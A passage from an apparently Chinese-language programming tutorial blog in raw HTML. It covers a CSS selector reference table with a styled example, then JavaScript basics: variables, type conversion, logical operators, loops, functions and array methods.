align="left">element,elemen</td><td align="left">div,p</td><td align="left">选择所有 <div> 元素和所有 <p> 元素。</td><td align="left">1</td></tr><tr><td align="left">element element</td><td align="left">div p</td><td align="left">选择 <div> 元素内部的所有 <p> 元素。</td><td align="left">1</td></tr><tr><td align="left">element*&gt;element</td><td align="left">div&gt;p</td><td align="left">选择父元素为 <div> 元素的所有 <p> 元素。</td><td align="left">2</td></tr><tr><td align="left">element+element</td><td align="left">div+p</td><td align="left">选择紧接在 <div> 元素之后的所有 <p> 元素。</td><td align="left">2</td></tr><tr><td align="left">[attribute]</td><td align="left">[target]</td><td align="left">选择带有 target 属性所有元素。</td><td align="left">2</td></tr><tr><td align="left">[attribute=value]</td><td align="left">[target=_blank]</td><td align="left">选择 target=”_blank” 的所有元素。</td><td align="left">2</td></tr><tr><td align="left">[attribute~=value]</td><td align="left">[title~=flower]</td><td align="left">选择 title 属性包含单词 “flower” 的所有元素。</td><td align="left">2</td></tr><tr><td align="left">[attribute|=value]</td><td align="left">[lang|=en]</td><td align="left">选择 lang 属性值以 “en” 开头的所有元素。</td><td align="left">2</td></tr><tr><td align="left">:link</td><td align="left">a:link</td><td align="left">选择所有未被访问的链接。</td><td align="left">1</td></tr><tr><td align="left">:visited</td><td align="left">a:visited</td><td align="left">选择所有已被访问的链接。</td><td align="left">1</td></tr><tr><td align="left">:active</td><td align="left">a:active</td><td align="left">选择活动链接。</td><td align="left">1</td></tr><tr><td align="left">:hover</td><td align="left">a:hover</td><td align="left">选择鼠标指针位于其上的链接。</td><td align="left">1</td></tr><tr><td align="left">:focus</td><td align="left">input:focus</td><td align="left">选择获得焦点的 input 元素。</td><td align="left">2</td></tr><tr><td align="left">:first-letter</td><td align="left">p:first-letter</td><td align="left">选择每个 <p> 元素的首字母。</td><td align="left">1</td></tr><tr><td align="left">:first-line</td><td align="left">p:first-line</td><td align="left">选择每个 <p> 元素的首行。</td><td align="left">1</td></tr><tr><td align="left">:first-child</td><td align="left">p:first-child</td><td align="left">选择属于父元素的第一个子元素的每个 <p> 元素。</td><td align="left">2</td></tr><tr><td align="left">:before</td><td align="left">p:before</td><td align="left">在每个 <p> 元素的内容之前插入内容。</td><td align="left">2</td></tr><tr><td align="left">:after</td><td align="left">p:after</td><td align="left">在每个 <p> 元素的内容之后插入内容。</td><td align="left">2</td></tr><tr><td align="left">:lang(<em>language</em>)</td><td align="left">p:lang(it)</td><td align="left">选择带有以 “it” 开头的 lang 属性值的每个 <p> 元素。</td><td align="left">2</td></tr><tr><td align="left">element1~element2</td><td align="left">p~ul</td><td align="left">选择前面有 <p> 元素的每个 <ul> 元素。</td><td align="left">3</td></tr><tr><td align="left">[attribute^=value]</td><td align="left">a[src^=”https”]</td><td align="left">选择其 src 属性值以 “https” 开头的每个 <a> 元素。</td><td align="left">3</td></tr><tr><td align="left">[attribute$=value]</td><td align="left">a[src$=”.pdf”]</td><td align="left">选择其 src 属性以 “.pdf” 结尾的所有 <a> 元素。</td><td align="left">3</td></tr><tr><td align="left">[attribute*=value]</td><td align="left">a[src*=”abc”]</td><td align="left">选择其 src 属性中包含 “abc” 子串的每个 <a> 元素。</td><td align="left">3</td></tr><tr><td align="left">:first-of-type</td><td align="left">p:first-of-type</td><td align="left">选择属于其父元素的首个 <p> 元素的每个 <p> 元素。</td><td align="left">3</td></tr><tr><td align="left">:last-of-type</td><td align="left">p:last-of-type</td><td align="left">选择属于其父元素的最后 <p> 元素的每个 <p> 元素。</td><td align="left">3</td></tr><tr><td align="left">:only-of-type</td><td align="left">p:only-of-type</td><td align="left">选择属于其父元素唯一的 <p> 元素的每个 <p> 元素。</td><td align="left">3</td></tr><tr><td align="left">:only-child</td><td align="left">p:only-child</td><td align="left">选择属于其父元素的唯一子元素的每个 <p> 元素。</td><td align="left">3</td></tr><tr><td align="left">:nth-child(<em>n</em>)</td><td align="left">p:nth-child(2)</td><td align="left">选择属于其父元素的第二个子元素的每个 <p> 元素。</td><td align="left">3</td></tr><tr><td align="left">:nth-last-child(<em>n</em>)</td><td align="left">p:nth-last-child(2)</td><td align="left">同上，从最后一个子元素开始计数。</td><td align="left">3</td></tr><tr><td align="left">:nth-of-type(<em>n</em>)</td><td align="left">p:nth-of-type(2)</td><td align="left">选择属于其父元素第二个 <p> 元素的每个 <p> 元素。</td><td align="left">3</td></tr><tr><td align="left">:nth-last-of-type(<em>n</em>)</td><td align="left">p:nth-last-of-type(2)</td><td align="left">同上，但是从最后一个子元素开始计数。</td><td align="left">3</td></tr><tr><td align="left">:last-child</td><td align="left">p:last-child</td><td align="left">选择属于其父元素最后一个子元素每个 <p> 元素。</td><td align="left">3</td></tr><tr><td align="left">:root</td><td align="left">:root</td><td align="left">选择文档的根元素。</td><td align="left">3</td></tr><tr><td align="left">:empty</td><td align="left">p:empty</td><td align="left">选择没有子元素的每个 <p> 元素（包括文本节点）。</td><td align="left">3</td></tr><tr><td align="left">:target</td><td align="left">#news:target</td><td align="left">选择当前活动的 #news 元素。</td><td align="left">3</td></tr><tr><td align="left">:enabled</td><td align="left">input:enabled</td><td align="left">选择每个启用的 <input> 元素。</td><td align="left">3</td></tr><tr><td align="left">:disabled</td><td align="left">input:disabled</td><td align="left">选择每个禁用的 <input> 元素</td><td align="left">3</td></tr><tr><td align="left">:checked</td><td align="left">input:checked</td><td align="left">选择每个被选中的 <input> 元素。</td><td align="left">3</td></tr><tr><td align="left">:not(<em>selector</em>)</td><td align="left">:not(p)</td><td align="left">选择非 <p> 元素的每个元素。</td><td align="left">3</td></tr><tr><td align="left">::selection</td><td align="left">::selection</td><td align="left">选择被用户选取的元素部分。</td><td align="left">3</td></tr></tbody></table><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 所有元素选择器 *，通常用于去除边距 */</span></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 类选择器，通常用于设置一类样式 */</span></span><br><span class="line"><span class="selector-class">.color-red</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* id 选择器，通常在一个页面内是唯一的 */</span></span><br><span class="line"><span class="selector-id">#my-id</span> &#123;</span><br><span class="line">    <span class="attribute">text-indent</span>: <span class="number">4em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 标签选择器(多个标签逗号隔开)，指定所有标签的样式 */</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">text-indent</span>: <span class="number">2em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 子孙元素选择器，直接或间接包含的元素 */</span></span><br><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: deeppink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 子元素选择器，直接元素 */</span></span><br><span class="line"><span class="selector-class">.outer</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: hotpink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 紧跟在指定元素后的另一个元素 */</span></span><br><span class="line"><span class="selector-class">.l2</span>+<span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: deeppink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 伪类选择器 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: greenyellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:first-letter</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">li</span><span class="selector-pseudo">:first-child</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">li</span><span class="selector-pseudo">:nth-child(3)</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-pseudo">:nth-child(2n)</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: gray;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 伪元素选择器 */</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::selection</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: pink;</span><br><span class="line">    <span class="attribute">color</span>: hotpink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Javascript语言基础"><a href="#Javascript语言基础" class="headerlink" title="Javascript语言基础"></a>Javascript语言基础</h1><h2 id="语法基础"><a href="#语法基础" class="headerlink" title="语法基础"></a>语法基础</h2><h3 id="变量的声明与定义"><a href="#变量的声明与定义" class="headerlink" title="变量的声明与定义"></a>变量的声明与定义</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 变量的声明，定义多个局部变量</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量的定义不需要添加关键字</span></span><br><span class="line">ga = <span class="number">0</span>, gb = <span class="number">0</span>, gc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语句块变量，只能在包含它的语句块中使用</span></span><br><span class="line"><span class="keyword">let</span> la = <span class="number">0</span>, lb = <span class="number">0</span>, lc = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="获取变量的类型"><a href="#获取变量的类型" class="headerlink" title="获取变量的类型"></a>获取变量的类型</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取变量的类型</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(<span class="literal">true</span>), <span class="keyword">typeof</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通常通过判断一个变量的类型是否是 undefined 确定它有没有被创建</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(pb51))</span><br><span class="line"></span><br><span class="line"><span class="comment">// number 表示数值，可以是浮点数小数以及 NaN，通过 isNaN 判断是不是 number</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">isNaN</span>(<span class="number">123</span>), <span class="built_in">isNaN</span>(<span class="string">&quot;abc&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="数值转换"><a href="#数值转换" class="headerlink" title="数值转换"></a>数值转换</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数值转换 Number，将一个有效的数字字符串转换成相应的 number</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Number</span>(<span class="string">&quot;123&quot;</span>), <span class="built_in">Number</span>(<span class="string">&quot;123abc&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数值转换 parseInt，支持十六进制和十进制，从开始位置转换到非数字字符</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">parseInt</span>(<span class="string">&quot;123&quot;</span>), <span class="built_in">parseInt</span>(<span class="string">&quot;0x123&quot;</span>), <span class="built_in">parseInt</span>(<span class="string">&quot;123abc&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数值转换 parseFloat，转换成浮点数，使用和 parseInt 类似</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">parseFloat</span>(<span class="string">&quot;123.123&quot;</span>), <span class="built_in">parseFloat</span>(<span class="string">&quot;123.1abc&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以将任何对象(实现了 toString)通过 toString 转换成 String 类型，</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">String</span>(<span class="number">123</span>))</span><br></pre></td></tr></table></figure><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全等比较，同时比较类型和数值是否相同</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">123</span> == <span class="string">&quot;123&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">123</span> === <span class="string">&quot;123&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 并且操作，返回假的那个</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;&quot;</span> &amp;&amp; <span class="number">123</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者操作，返回真的那个</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;&quot;</span> || <span class="number">123</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ! 和 !! ，! 返回的永远是 boolean，!!用于将自己转换成 boolean</span></span><br><span class="line"><span class="built_in">console</span>.log(!!<span class="string">&quot;123&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断密码是否正确的一个例子</span></span><br><span class="line"><span class="keyword">var</span> password = <span class="string">&quot;123abc&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Number</span>(password))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (password.length &lt; <span class="number">6</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;请输入6位数字密码&quot;</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">// 通过 Number 转换的返回值确定是不是全整数</span></span><br><span class="line">    <span class="comment">// NaN 和包括自己在内的任何值比较都是 false</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isNaN</span>(<span class="built_in">Number</span>(password)))</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;请输入数字密码&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;密码格式正确&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">NaN</span> == <span class="literal">NaN</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">isNaN</span>(<span class="literal">NaN</span>))</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 循环输出 0 到 100 的所有值</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> number = <span class="number">0</span>; number &lt; <span class="number">100</span>; ++number)</span><br><span class="line"><span class="built_in">console</span>.log(number)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印九九乘法表</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">1</span>; x &lt;= <span class="number">9</span>; ++x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> y = <span class="number">1</span>; y &lt;= x; ++y)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(y, <span class="string">&quot;×&quot;</span>, x, <span class="string">&quot;=&quot;</span>, y*x)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// js 使用 function 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a, b, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">func(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 在每一个函数中都有一个 arguments，保存的是由参数组成的列表</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line">func2(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func3 = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(a,b, c)</span><br><span class="line">&#125;</span><br><span class="line">func3(<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数和匿名函数之间在操作 DOM 或者 BOM 对象的时候，作用域的表现不同</span></span><br><span class="line"><span class="keyword">var</span> fun4 = <span class="function">(<span class="params">a, b, c</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a, b, c)</span><br><span class="line">&#125;</span><br><span class="line">fun4(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="对象的使用"><a href="#对象的使用" class="headerlink" title="对象的使用"></a>对象的使用</h2><h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">array</span><br><span class="line"></span><br><span class="line"><span class="comment">// push 将元素按顺序添加到数组的结尾</span></span><br><span class="line">array.push(<span class="string">&#x27;r1&#x27;</span>, <span class="string">&#x27;r2&#x27;</span>, <span class="string">&#x27;r3&#x27;</span>);</span><br><span class="line">array;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过设置 length 可以截断数组</span></span><br><span class="line">array.length = <span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(array)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顺序将元素的添加到数组的开头</span></span><br><span class="line">array.unshift(<span class="string">&#x27;l1&#x27;</span>, <span class="string">&#x27;l2&#x27;</span>, <span class="string">&#x27;l3&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(array)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除数组的最后一个元素</span></span><br><span class="line">array.pop()</span><br><span class="line"><span class="built_in">console</span>.log(array)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除数组的第一个元素</span></span><br><span class="line">array.shift()</span><br><span class="line"><span class="built_in">console</span>.log(array)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数组转换成字符串</span></span><br><span class="line">str = array.join(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反转数组中的所有元素</span></span><br><span class="line">str = array.reverse()</span><br><span class="line"><span class="built_in">console</span>.log(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对列表进行排序，提供的函数规定了排序的方式</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a-b))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line">array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="built_in">console</span>.log(array.splice(<span class="number">0</span>, <span class="number">3</span>))<span class="comment">// 返回删除的元素组成的数组</span></span><br><span class="line"><span class="built_in">console</span>.log(array)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加元素</span></span><br><span class="line">array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">array.splice(<span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>)</span><br><span class="line"><span class="built_in">console</span>.log(array)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换元素</span></span><br><span class="line">array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">array.splice(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(array)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找元素，从前查找第一个后从后查找第一个</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>].indexOf(<span class="number">2</span>))</span><br><span class="line"><span 